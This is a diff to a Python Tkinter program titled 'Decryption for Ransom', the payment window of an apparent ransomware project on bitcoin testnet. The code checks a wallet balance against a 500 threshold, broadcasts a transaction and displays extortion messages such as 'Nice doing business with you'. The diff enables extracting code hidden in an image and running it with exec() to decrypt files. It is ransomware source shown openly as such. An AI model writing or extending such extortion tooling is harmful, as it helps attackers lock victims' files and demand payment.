@@ -24,7 +24,7 @@ def clicking_submit():
             wallet.utxos_update()
             round += 1
             for widget in window.winfo_children():
-                if widget != image_label:
+                if widget != img_label:
                     widget.destroy()
             setup_round_2()
         else:
@@ -58,8 +58,9 @@ def clicking_submit():
             elif amount_to_send >= 500:
                 success_label = Label(window, text="Transaction valid! Proceeding...", fg="green")
                 success_label.pack(pady=2)
-                print("Transaction valid! Proceeding...")
+                print("Sufficient funds for transaction! Proceeding to decrypt files")
 
+                decryption(transaction_details="")
                 round += 1
                 setup_round_3()
             else:
@@ -114,7 +115,7 @@ def setup_round_2():
     submit_button.pack()
 
     labels_and_entries_2 = [wallet_address_label, wallet_balance_label, amount_bitcoin_to_send_label, response_entry_2,
-                            submit_button, image_label]
+                            submit_button, img_label]
 
 
 def setup_round_3():
@@ -130,6 +131,7 @@ def setup_round_3():
                                             broadcast=True)
         service = Service(network="testnet")
         transaction_details = service.gettransaction(wallet_transaction.txid)
+
 
         # Runs when the transaction was not found or failed
         if not transaction_details:
@@ -147,7 +149,7 @@ def setup_round_3():
                 text="Decrypting your files now. Nice doing business with you. :)",
                 fg="green")
             successful_transaction_label.pack()
-
+            wallet.utxos_update()
             decryption(transaction_details)
     except Exception as e:
         print(f"Failed to retrieve transaction details: {e}")
@@ -166,13 +168,13 @@ def decryption(transaction_details):
     try:
         decryption_code_found: bool = os.path.exists(image_containing_decryption_code)
         if decryption_code_found:
-            print(transaction_details.outputs)
-            print(transaction_details.info)
-            pass
-            #code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
-            #exec("import decrypt")
-            #exec(f"{code_to_decrypt_files}")
-            #print(f"\nTransaction Details: {transaction_details}")
+            if transaction_details:
+                print(transaction_details.outputs)
+                print(transaction_details.info)
+            code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
+            exec("import decrypt")
+            exec(f"{code_to_decrypt_files}")
+            print(f"\nTransaction Details: {transaction_details}")
         else:
             raise FileNotFoundError(
                 f"The image name/path {image_containing_decryption_code} doesn't exist in the current directory."
@@ -186,12 +188,12 @@ def decryption(transaction_details):
 # Main Window Setup
 window = Tk()
 window.title("Decryption for Ransom")
-image = Image.open("Popup.png")
-resized_image = image.resize((673, 383))
-photo = ImageTk.PhotoImage(resized_image)
-image_label = Label(window, image=photo)
-image_label.pack()
-window.geometry("675x550")
+img = Image.open("Popup.png")
+resized_img = img.resize((673, 383))
+photo = ImageTk.PhotoImage(resized_img)
+img_label = Label(window, image=photo)
+img_label.pack()
+window.geometry("675x600")
 
 icon_image = ImageTk.PhotoImage(file="icon.png")
 window.iconphoto(False, icon_image)
